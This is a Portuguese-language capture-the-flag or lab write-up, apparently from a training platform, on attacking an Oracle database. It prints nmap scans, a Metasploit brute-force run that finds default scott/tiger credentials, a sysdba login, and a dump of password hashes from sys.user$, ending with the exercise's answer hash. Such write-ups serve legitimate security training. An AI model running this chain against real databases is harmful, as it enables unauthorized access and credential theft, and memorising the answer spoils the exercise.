## Alvo
- IP -> 10.129.205.19

## Objetivo
-  Enumere o banco de dados Oracle de destino e envie o hash de senha do usuário DBSNMP como a resposta. -> E066D214D5421CCC

## Ferramentas e scripts utilizados
- nmap
- msfconsole
- sqlplus
## Resultados obtidos
```
sudo nmap -sS 10.129.205.19                                                                                      
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 19:55 -0400
Nmap scan report for 10.129.205.19
Host is up (0.52s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds
```
--- 
```
sudo nmap -sV --script oracle* 10.129.205.19 -p 1521
Nmap scan report for 10.129.205.19
Host is up (0.26s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 603.73 seconds
```
--- 
```
auxilliary(admin/oracle/oracle_togin) > set SID XE
=> XE
auxiliary(admin/oracle/oracle_login) > set RHOST 10.129.171.192
RHOST = 10.129.171.192
auxiliary(admin/oracle/oracle_login) > exploit
Starting brute force on 10.129.171.192:1521...
Found user/pass of: scott/tiger on 10.129.171.192 with sid XE
Auxiliary module execution completed
auxiliary(admin/oracle/oracle_login) > 
```
--- 
```
sqlplus scott/tiger@10.129.171.192/XE as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Thu Aug 27 21:40:47 2026
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select name , password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
DBFS_ROLE
DIP                            CE4A36B8E06CA59C
AQ_ADMINISTRATOR_ROLE
AQ_USER_ROLE
DATAPUMP_EXP_FULL_DATABASE
DATAPUMP_IMP_FULL_DATABASE
ADM_PARALLEL_EXECUTE_TASK
GATHER_SYSTEM_STATISTICS
XDB_WEBSERVICES_OVER_HTTP

NAME                           PASSWORD
------------------------------ ------------------------------
ORACLE_OCM                     5A2E026A9157958C
RECOVERY_CATALOG_OWNER
SCHEDULER_ADMIN
HS_ADMIN_SELECT_ROLE
HS_ADMIN_EXECUTE_ROLE
HS_ADMIN_ROLE
OEM_ADVISOR
OEM_MONITOR
DBSNMP                         E066D214D5421CCC
```
## Considerações
Primeiramente utilizei o nmap para buscar todas as portas e serviços rodando , nisso a 1521 do oracle estava aberta e com ele nela , assim passei para agora utilizar -sV e todos os scripts oracle nessa porta. Com isso recebi que havia um SID XE mapeado . A partir dele utilizei o msfconsole (metasploit) com o módulo admin/oracle/oracle_login ,responsável por fazer brute force de user e senha em cima de um SID, e nisso recebi o user scott com senha tiger. A partir disso loguei no banco com essas credenciais já presumindo que o admin tivesse configurado mais privilégios do que devia , assim conectei como sysdba e assim já fui na tabela onde estavam os nomes de usuários e senhas , com isso peguei a hash de senha do DBSNMP . 

